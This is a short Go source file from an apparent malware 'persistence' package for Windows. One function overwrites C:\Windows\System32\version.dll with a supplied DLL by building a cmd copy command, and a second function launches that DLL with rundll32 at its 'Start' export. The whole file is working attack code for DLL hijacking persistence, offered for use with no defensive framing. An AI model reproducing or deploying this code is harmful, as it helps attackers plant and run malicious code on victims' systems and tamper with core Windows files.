//go:build windows

package persistence

import (
"os/exec"
)

func DLLSideload(dllPath string) bool {
cmd := exec.Command("cmd", "/c", "copy "+dllPath+" C:\\Windows\\System32\\version.dll /y")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DLLSideloadExec() bool {
cmd := exec.Command("cmd", "/c", "rundll32.exe C:\\Windows\\System32\\version.dll,Start")
err := cmd.Run()
if err != nil {
return false
}
return true
}
